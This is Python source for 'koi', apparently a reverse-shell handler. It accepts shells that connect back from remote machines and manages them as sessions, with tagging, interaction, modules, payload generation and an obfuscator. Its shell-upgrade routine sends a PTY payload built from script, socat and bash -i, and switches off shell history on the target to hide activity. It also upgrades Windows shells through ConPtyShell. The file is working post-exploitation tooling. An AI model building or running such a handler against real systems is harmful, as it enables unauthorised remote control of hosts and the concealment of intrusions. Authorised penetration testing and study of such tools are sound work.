from __future__ import annotations

import os
import re
import select
import shutil
import signal
import socket
import sys
import threading
import time
from typing import Callable, Dict, Optional

from koi.utils.config import CONFIG
from koi.utils.cli import print_help, set_session_provider
from koi.utils.powerupgrade import upgrade_windows_conptyshell
from koi.utils.interact import interact
from koi.modules.loader import load_modules, get_module
from koi.session import Session
from koi.utils.ui import (
    colored_text, display_art, print_report_box,
    breaker_with_text, notify, Spinner, print_payloads,
    platform_badge,
    PUMPKIN, WHITE, SILVER, CORAL,
    bold, plain, muted, accent, alert,
    gradient_text, yesno,
)
from koi.utils.obfuscate_ui import run_obfuscate_ui

LOCALUSER = os.getenv("USER") or os.getenv("USERNAME") or "user"

_IPV4_TEXT  = re.compile(r'(?<!\d)(?:25[0-5]|2[0-4]\d|[01]?\d\d?)(?:\.(?:25[0-5]|2[0-4]\d|[01]?\d\d?)){3}(?!\d)')
_IPV4_BYTES = re.compile(rb'(?<!\d)(?:25[0-5]|2[0-4]\d|[01]?\d\d?)(?:\.(?:25[0-5]|2[0-4]\d|[01]?\d\d?)){3}(?!\d)')
_MAC_TEXT   = re.compile(r'(?<![0-9a-fA-F])(?:[0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}(?![0-9a-fA-F])')
_MAC_BYTES  = re.compile(rb'(?<![0-9a-fA-F])(?:[0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}(?![0-9a-fA-F])')
_PROMPT_ARROW = gradient_text(" ❯ ", PUMPKIN, CORAL)


class _MaskBinary:
    def __init__(self, real, check):
        self._real  = real
        self._check = check

    def write(self, b):
        if self._check():
            b = _IPV4_BYTES.sub(b'<IP>', b)
            b = _MAC_BYTES.sub(b'<MAC>', b)
        return self._real.write(b)

    def __getattr__(self, name):
        return getattr(self._real, name)


class _MaskStream:
    def __init__(self, real, check):
        self._real  = real
        self._check = check
        self.buffer = _MaskBinary(real.buffer, check)

    def write(self, s):
        if self._check():
            s = _IPV4_TEXT.sub('<IP>', s)
            s = _MAC_TEXT.sub('<MAC>', s)
        return self._real.write(s)

    def __getattr__(self, name):
        return getattr(self._real, name)


class Listener:
    def __init__(self, host: str = "0.0.0.0", port: int = 4010):
        self.host = host
        self.port = port
        self._sessions: Dict[int, Session] = {}
        self._next_id = 1
        self._id_lock = threading.Lock()
        self._running = False
        self._server_sock: Optional[socket.socket] = None
        self._notify_r, self._notify_w = os.pipe()
        self._in_session = False
        self._pending_notifications: list = []
        self._notif_lock = threading.Lock()
        self._pending_conpty: dict = {}
        self._conpty_staging: dict = {}
        self._conpty_lock = threading.Lock()
        self.screenable_mode: bool = False
        self._accepting: bool = True
        self._loggers: dict = {}

    def _mask_ip(self, ip: str, kind: str = "remote") -> str:
        """Return a placeholder instead of a real IP when screenable mode is active."""
        if self.screenable_mode:
            return "<LOCAL IP>" if kind == "local" else "<REMOTE IP>"
        return ip

    def _toggle_screenable(self) -> None:
        self.screenable_mode = not self.screenable_mode
        state = plain("ON") if self.screenable_mode else muted("OFF")
        self._execute_hidden_command(lambda: notify('info', f"Screenable mode {state}"))

    def _add(self, conn, addr) -> Session:
        with self._id_lock:
            sid = self._next_id
            self._next_id += 1
        sess = Session(id=sid, conn=conn, addr=addr)
        self._sessions[sid] = sess
        return sess

    def _resolve_session(self, ref: str) -> Optional[Session]:
        try:
            return self._sessions.get(int(ref))
        except ValueError:
            return next((s for s in self._sessions.values() if s.tag == ref), None)

    def _session_refs(self) -> list[str]:
        refs = []
        for s in self._sessions.values():
            if s.alive:
                refs.append(str(s.id))
                if s.tag:
                    refs.append(s.tag)
        return refs

    def _remove(self, sid: int) -> None:
        sess = self._sessions.pop(sid, None)
        if sess:
            sess.close()
        if sid in self._loggers:
            self._loggers[sid].log_event("terminated")
            self._loggers[sid].close()
            del self._loggers[sid]

    def _prune(self) -> None:
        for sid in [k for k, s in self._sessions.items() if not s.alive]:
            self._remove(sid)

    def _accept_loop(self):
        while self._running:
            try:
                self._server_sock.settimeout(1.0)
                conn, addr = self._server_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            if not self._accepting and addr[0] not in self._pending_conpty:
                conn.close()
                continue

            if addr[0] in self._pending_conpty:
                os_type = self._pending_conpty.pop(addr[0])
                staging = Session(id=-1, conn=conn, addr=addr)
                staging.os_type = os_type
                with self._conpty_lock:
                    self._conpty_staging[addr[0]] = staging
                continue

            sess = self._add(conn, addr)

            threading.Thread(
                target=self._detect_and_notify,
                args=(sess,),
                daemon=True,
                name=f"detect-{sess.id}",
            ).start()

    def _detect_and_notify(self, sess: Session) -> None:
        from koi.utils.detect import detect_os
        detect_os(sess)

        if not sess.alive:
            return

        os_tag = f" {muted('[')} {sess.os_label()} {muted(']')}" if sess.os_type else ""
        masked_ip = self._mask_ip(sess.addr[0])
        msg = f"{bold(plain(f'#{sess.id}'))}  {plain(masked_ip)}{muted(f':{sess.addr[1]}')}{os_tag}"
        os.write(self._notify_w, b"1\n")

        if self._in_session:
            with self._notif_lock:
                self._pending_notifications.append(('new', msg))
        else:
            import readline as _rl
            buf = _rl.get_line_buffer()
            sys.stdout.write(f"\r\033[K")
            notify('new', msg)
            sys.stdout.write(self._prompt() + buf)
            sys.stdout.flush()
            _rl.redisplay()

    def start(self):
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind((self.host, self.port))
        self._server_sock.listen(16)
        self._running = True

        set_session_provider(self._session_refs)
        sys.stdout = _MaskStream(sys.stdout, lambda: self.screenable_mode)
        sys.stderr = _MaskStream(sys.stderr, lambda: self.screenable_mode)

        threading.Thread(target=self._accept_loop, daemon=True, name="accept").start()

        if CONFIG["display_art"]:
            display_art()
        notify('info', f"Listening on {bold(self.host)}:{bold(self.port)}")
        self._warn_log_accumulation()
        print()

        self._main_loop()

    def stop(self):
        self._running = False
        if self._server_sock:
            try:
                self._server_sock.close()
            except OSError:
                pass
        with Spinner("Closing sessions..."):
            sessions = list(self._sessions.values())
            for s in sessions:
                if s.upgraded:
                    s.send(b"exit\n")
            if any(s.upgraded for s in sessions):
                time.sleep(0.5)
            for s in sessions:
                s.close()

    def _prompt(self) -> str:
        alive = sum(1 for s in self._sessions.values() if s.alive)
        noun = "session" if alive == 1 else "sessions"
        count = colored_text(str(alive), PUMPKIN if alive else SILVER)
        anon_tag = colored_text(" [ANON]", PUMPKIN) if self.screenable_mode else ""
        pause_tag = colored_text(" [PAUSED]", CORAL) if not self._accepting else ""
        raw = (
            f"{LOCALUSER}"
            + colored_text("@", PUMPKIN)
            + colored_text("koi", WHITE)
            + anon_tag
            + pause_tag
            + muted("(")
            + count
            + muted(f" {noun})")
            + _PROMPT_ARROW
        )
        return re.sub(r'\033\[[^m]*m', lambda m: f'\001{m.group()}\002', raw)

    def _main_loop(self):
        _ctrlc = 0
        while self._running:
            try:
                r, _, _ = select.select([self._notify_r], [], [], 0)
                if r:
                    os.read(self._notify_r, 4096)
                raw = input(self._prompt()).strip()
                _ctrlc = 0
            except EOFError:
                break
            except KeyboardInterrupt:
                import readline as _rl
                had_text = bool(_rl.get_line_buffer().strip())
                print()
                if had_text:
                    _ctrlc = 0
                else:
                    _ctrlc += 1
                    if _ctrlc >= 3:
                        notify('info', f"Use {bold('exit')} to quit cleanly.")
                        _ctrlc = 0
                continue

            if not raw:
                continue

            if raw == "_koi_screenable_":
                import readline as _rl
                try:
                    _rl.remove_history_item(_rl.get_current_history_length() - 1)
                except Exception:
                    pass
                self._toggle_screenable()
                continue

            if raw == "_koi_toggle_":
                import readline as _rl
                try:
                    _rl.remove_history_item(_rl.get_current_history_length() - 1)
                except Exception:
                    pass
                self._toggle_accepting()
                continue

            parts = raw.split()
            cmd = parts[0].lower()

            if cmd in ("exit", "quit"):
                self.stop()
                return

            elif cmd in ("help", "h", "?"):
                print_help()

            elif cmd == "stop":
                self._cmd_stop_accepting()

            elif cmd == "start":
                self._cmd_start_accepting()

            elif cmd in ("ls", "l", "list"):
                self._cmd_ls()

            elif cmd in ("go", "g", "interact"):
                if len(parts) < 2:
                    notify('error', f"Usage: go {accent('<id|tag>')}")
                else:
                    self._cmd_go(parts[1])

            elif cmd in ("upgrade", "u"):
                if len(parts) < 2:
                    notify('error', f"Usage: upgrade {accent('<id|tag>')}")
                else:
                    self._cmd_upgrade(parts[1])

            elif cmd == "kill":
                if len(parts) < 2:
                    notify('error', f"Usage: kill {accent('<id|tag>')}")
                else:
                    self._cmd_kill(parts[1])

            elif cmd in ("payload", "p"):
                self._cmd_payload(parts[1] if len(parts) > 1 else None)

            elif cmd in ("obfuscator", "obs", "cook"):
                self._cmd_obfuscate(parts[1] if len(parts) > 1 else None)

            elif cmd in ("logs", "log"):
                self._cmd_logs()

            elif cmd in ("modules", "mdls", "mods"):
                self._cmd_modules()

            elif cmd in ("reload", "refresh", "rl"):
                self._cmd_reload()

            elif cmd == "run":
                self._dispatch_run(parts)

            elif cmd in ("setshell", "sh"):
                if len(parts) < 3:
                    notify('error', f"Usage: setshell {accent('<id|tag>')} {accent('<linux|windows_ps|windows_cmd>')}")
                else:
                    self._cmd_setshell(parts[1], parts[2])

            elif cmd == "tag":
                if len(parts) < 2:
                    notify('error', f"Usage: tag {accent('<id|tag>')} {accent('[name]')}")
                else:
                    self._cmd_tag(parts[1], parts[2] if len(parts) > 2 else None)

            else:
                notify('error', f"Unknown command: {accent(cmd)}, type {bold('help')}")

    def _dispatch_run(self, parts: list) -> None:
        if len(parts) < 3:
            if len(parts) == 2:
                mod_cls = get_module(parts[1])
                if mod_cls and mod_cls.usage:
                    notify('error', f"Usage: run {accent(mod_cls.usage)}")
                elif mod_cls:
                    notify('error', f"Usage: run {accent(mod_cls.name)} {accent('<id>')}")
                else:
                    notify('error', f"Unknown module {accent(parts[1])}, type {bold('modules')}")
            else:
                notify('error', f"Usage: run {accent('<module>')} {accent('<id>')} {accent('[args...]')}")
            return

        mod_name = parts[1]
        self._cmd_run(mod_name, parts[2], parts[3:])

    def _cmd_stop_accepting(self) -> None:
        if not self._accepting:
            notify('warning', "Listener is already paused.")
            return
        self._accepting = False
        notify('warning', f"Listener {bold('paused')}, new connections refused.")

    def _cmd_start_accepting(self) -> None:
        if self._accepting:
            notify('info', "Listener is already accepting connections.")
            return
        self._accepting = True
        notify('success', f"Listener {bold('resumed')}, accepting new connections.")

    def _execute_hidden_command(self, callback: Callable[[], None]) -> None:
        sys.stdout.write("\033[F\033[2K")
        callback()
        sys.stdout.flush()

    def _toggle_accepting(self) -> None:
        if self._accepting:
            self._execute_hidden_command(self._cmd_stop_accepting)
        else:
            self._execute_hidden_command(self._cmd_start_accepting)

    def _cmd_ls(self) -> None:
        self._prune()
        if not self._sessions:
            notify('status', muted('No active sessions.'))
            return
        data = {}
        for s in sorted(self._sessions.values(), key=lambda x: x.id):
            masked_ip = self._mask_ip(s.addr[0])
            tag_part = f" {muted('[')}{accent(s.tag)}{muted(']')}" if s.tag else ""
            key = f"#{s.id}{tag_part}  {s.status_dot()}  {plain(masked_ip)}{muted(f':{s.addr[1]}')} [{s.os_label()}]"
            data[key] = s._uptime()
        print_report_box("Sessions", data)

    def _warn_log_accumulation(self, threshold: int = 30) -> None:
        from koi.utils.logger import list_logs
        logs = list_logs()
        if len(logs) > threshold:
            notify('warning',
                f"{accent(str(len(logs)))} logs stored, "
                f"use {alert('koireview')} to check them out or {alert('koireview --clear')} to clear them."
            )

    def _cmd_logs(self) -> None:
        from koi.utils.logger import print_log_list
        print_log_list()

    def _cmd_reload(self) -> None:
        with Spinner("Reloading modules..."):
            modules = load_modules(reload=True)
        notify('info', f"Loaded {accent(str(len(modules)))} modules.")

    def _cmd_upgrade(self, ref: str) -> None:
        self._prune()
        sess = self._resolve_session(ref)
        if sess is None:
            notify('error', f"Session {accent(ref)} not found.")
            return
        sid = sess.id
        if not sess.alive:
            notify('error', f"Session {accent(f'#{sid}')} is no longer alive.")
            self._remove(sid)
            return
        if sess.upgraded:
            notify('warning', f"Session {accent(f'#{sid}')} is already upgraded.")
            if not yesno("Do you want to try upgrading again?"):
                return

        if sess.os_type in ("windows_cmd", "windows_ps"):
            if sess.id not in self._loggers:
                from koi.utils.logger import start_logger
                lg = start_logger(sess)
                self._loggers[sess.id] = lg
                sess.log_path = str(lg.path)
                notify('info', f"Logging to {muted(lg.path.name)}")
            upgrade_windows_conptyshell(
                sess, self._sessions, self.port,
                self._pending_conpty, self._conpty_staging, self._conpty_lock,
                self._mask_ip, logger=self._loggers[sess.id],
            )
            return

        if sess.id not in self._loggers:
            from koi.utils.logger import start_logger
            lg = start_logger(sess)
            self._loggers[sess.id] = lg
            sess.log_path = str(lg.path)
            notify('info', f"Logging to {muted(lg.path.name)}")
        logger = self._loggers[sess.id]
        sess.attach_logger(logger)

        with Spinner("Upgrading shell..."):
            pty_payload = (
                'if command -v script >/dev/null 2>&1; then '
                    'exec script -qc /bin/bash /dev/null 2>/dev/null || exec script -q /dev/null /bin/bash 2>/dev/null; '
                'elif command -v socat >/dev/null 2>&1; then '
                    'exec socat file:$(tty),raw,echo=0 tcp-listen:4444; '
                'else '
                    'exec /bin/bash -i 2>/dev/null || exec /bin/sh -i 2>/dev/null; '
                'fi\n'
            )

            logger.log_event("upgrade_start")
            sess.send(pty_payload.encode())
            self._drain(sess, 0.8)

            if not sess.alive:
                notify('error', f"Session {accent(f'#{sid}')} died during upgrade.")
                return

            sess.send(b"export TERM=xterm-256color HISTSIZE=0 HISTFILESIZE=0\n")
            self._drain(sess, 0.3)

            self._sync_winsize(sess)
            self._drain(sess, 0.3)

            sess.upgraded = True
            logger.log_event("upgrade_done")

        notify('success', f"Shell {accent(f'#{sid}')} upgraded successfully.")

    def _cmd_kill(self, ref: str) -> None:
        sess = self._resolve_session(ref)
        if sess is None:
            notify('error', f"Session {accent(ref)} not found.")
            return
        sid = sess.id
        with Spinner(f"Terminating session #{sid}..."):
            if sess.upgraded:
                sess.send(b"exit\n")
                time.sleep(0.5)
            self._remove(sid)
        notify('success', f"Session {accent(f'#{sid}')} terminated.")

    def _cmd_go(self, ref: str) -> None:
        self._prune()
        sess = self._resolve_session(ref)
        if sess is None:
            notify('error', f"Session {accent(ref)} not found.")
            return
        sid = sess.id
        if not sess.alive:
            notify('error', f"Session {accent(f'#{sid}')} is no longer alive.")
            self._remove(sid)
            return

        ip, port = sess.addr
        is_windows_pty = sess.os_type in ("windows_cmd", "windows_ps") and sess.upgraded

        print()
        notify('info', f"Entering session {bold(alert(f'#{sid}'))} {plain(self._mask_ip(ip))}{muted(f':{port}')}")
        if sess.os_type in ("windows_cmd", "windows_ps") and not sess.upgraded:
            notify('status', muted('Ctrl+Z to background  ·  line-by-line mode'))
        else:
            notify('status', muted('Ctrl+Z to background  ·  Ctrl+C sends SIGINT to remote'))
        print()

        if sess.upgraded:
            if not is_windows_pty:
                self._sync_winsize(sess)
                self._drain(sess, 0.3)
                sess.send(b"\n")
                time.sleep(0.15)
            signal.signal(signal.SIGWINCH, lambda *_: self._winch(sess))

        if sess.os_type in ("windows_cmd", "windows_ps") and not sess.upgraded:
            sess.send(b"\r\n")
            time.sleep(0.2)

        breaker_with_text()

        if is_windows_pty:
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.flush()

        if sess.id not in self._loggers:
            from koi.utils.logger import start_logger
            lg = start_logger(sess)
            self._loggers[sess.id] = lg
            sess.log_path = str(lg.path)
            notify('info', f"Logging to {muted(lg.path.name)}")

        self._in_session = True
        logger = self._loggers[sess.id]
        sess.attach_logger(logger)
        logger.log_event(f"enter {self._mask_ip(ip)}:{port}")
        reason = interact(sess, logger=logger)
        logger.log_event(reason)
        self._in_session = False

        signal.signal(signal.SIGWINCH, signal.SIG_DFL)
        print()
        breaker_with_text()

        if reason == "backgrounded":
            print()
            notify('warning', f"Session {bold(plain(f'#{sid}'))} backgrounded. Back at listener shell.")
        elif reason == "disconnected":
            print()
            notify('error', f"Session {bold(plain(f'#{sid}'))} disconnected.")
            self._remove(sid)

        self._flush_pending_notifications()

    def _cmd_modules(self) -> None:
        modules = load_modules()
        if not modules:
            notify('status', muted("No modules found in src/koi/modules/."))
            return

        has_categories = any(cls.category for cls in modules.values())

        if has_categories:
            grouped = {}
            for name, cls in modules.items():
                cat = cls.category or "Other"
                grouped.setdefault(cat, {})[accent(name)] = f"{cls.description}  {platform_badge(cls.platform)}"
            print_report_box("Modules", grouped)
        else:
            data = {accent(name): f"{cls.description}  {platform_badge(cls.platform)}" for name, cls in modules.items()}
            print_report_box("Modules", data)

    def _cmd_run(self, mod_name: str, ref: str, mod_args: list) -> None:
        self._prune()
        sess = self._resolve_session(ref)
        if sess is None:
            notify('error', f"Session {accent(ref)} not found.")
            return
        sid = sess.id
        if not sess.alive:
            notify('error', f"Session {accent(f'#{sid}')} is no longer alive.")
            self._remove(sid)
            return

        mod_cls = get_module(mod_name)
        if mod_cls is None:
            available = ", ".join(load_modules().keys()) or "none"
            notify('error', f"Module {accent(mod_name)} not found.")
            notify('status', muted(f"Available: {available}"))
            return

        if not mod_cls.supports(sess.os_type):
            badge = platform_badge(mod_cls.platform)
            os_label = sess.os_label()
            notify('error', f"Module {accent(mod_name)} {badge} is not compatible with session {accent(f'#{sid}')} ({os_label}).")
            return

        notify('info', f"Running module {accent(mod_name)} on session {accent(f'#{sid}')}...")
        old_handler = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, lambda *_: (_ for _ in ()).throw(KeyboardInterrupt()))
        logger = self._loggers.get(sess.id)
        sess.attach_logger(logger)
        try:
            mod = mod_cls(session=sess, args=mod_args, logger=logger)
            mod.run_module()
        except KeyboardInterrupt:
            print()
            notify('warning', "Module interrupted.")
            if logger:
                logger.log_event(f"module_interrupted  {mod_name}")
        except Exception as exc:
            notify('error', f"Module raised an exception: {exc}")
            if logger:
                logger.log_event(f"module_error  {mod_name}  {exc}")
        finally:
            signal.signal(signal.SIGINT, old_handler)

    _OS_ALIASES: dict[str, str] = {
        "linux":       "linux",
        "windows_ps":  "windows_ps",
        "windows_cmd": "windows_cmd",
        "ps":          "windows_ps",
        "powershell":  "windows_ps",
        "cmd":         "windows_cmd",
    }

    def _cmd_setshell(self, ref: str, os_arg: str) -> None:
        self._prune()
        sess = self._resolve_session(ref)
        if sess is None:
            notify('error', f"Session {accent(ref)} not found.")
            return
        sid = sess.id

        os_type = self._OS_ALIASES.get(os_arg.lower())
        if os_type is None:
            valid = ", ".join(sorted(set(self._OS_ALIASES.values())))
            notify('error', f"Unknown OS type {accent(os_arg)!r}.  Valid: {muted(valid)}")
            return

        old = sess.os_label()
        sess.os_type = os_type

        if os_type == "linux":
            sess.encoding = "utf-8"
            sess.eol      = "\n"
        else:
            sess.encoding = "cp1252"
            sess.eol      = "\r\n"

        notify('success',
            f"Session {accent(f'#{sid}')} OS set: {old} -> {sess.os_label()}")

    def _cmd_tag(self, ref: str, tag: Optional[str]) -> None:
        sess = self._resolve_session(ref)
        if sess is None:
            notify('error', f"Session {accent(ref)} not found.")
            return
        if tag is None:
            sess.tag = None
            notify('success', f"Tag cleared for session {accent(f'#{sess.id}')}.")
            return
        conflict = next((s for s in self._sessions.values() if s.tag == tag and s.id != sess.id), None)
        if conflict:
            notify('error', f"Tag {accent(tag)!r} already used by session {accent(f'#{conflict.id}')}.")
            return
        sess.tag = tag
        notify('success', f"Session {accent(f'#{sess.id}')} tagged as {accent(tag)}.")

    def _cmd_payload(self, iface: Optional[str] = None) -> None:
        print_payloads(iface, self.port)

    def _cmd_obfuscate(self, iface: Optional[str] = None) -> None:
        run_obfuscate_ui(iface, self.port)

    def _flush_pending_notifications(self) -> None:
        with self._notif_lock:
            pending = self._pending_notifications[:]
            self._pending_notifications.clear()
        for msg_type, text in pending:
            notify(msg_type, text)

    def _drain(self, sess: Session, duration: float = 0.5) -> None:
        deadline = time.monotonic() + duration
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            try:
                r, _, _ = select.select([sess.conn], [], [], min(remaining, 0.05))
                if r:
                    sess.conn.recv(4096)
            except OSError:
                break

    def _sync_winsize(self, sess: Session) -> None:
        try:
            cols, rows = shutil.get_terminal_size()
        except Exception:
            return
        sess.send(f"stty rows {rows} cols {cols} 2>/dev/null\n".encode())

    def _winch(self, sess: Session) -> None:
        if sess.os_type in ("windows_cmd", "windows_ps"):
            if sess.is_conptyshell:
                try:
                    cols, rows = shutil.get_terminal_size()
                    sess.send(f"\x08{cols}x{rows}".encode())
                except Exception:
                    pass
            return
        self._sync_winsize(sess)
        self._drain(sess, 0.15)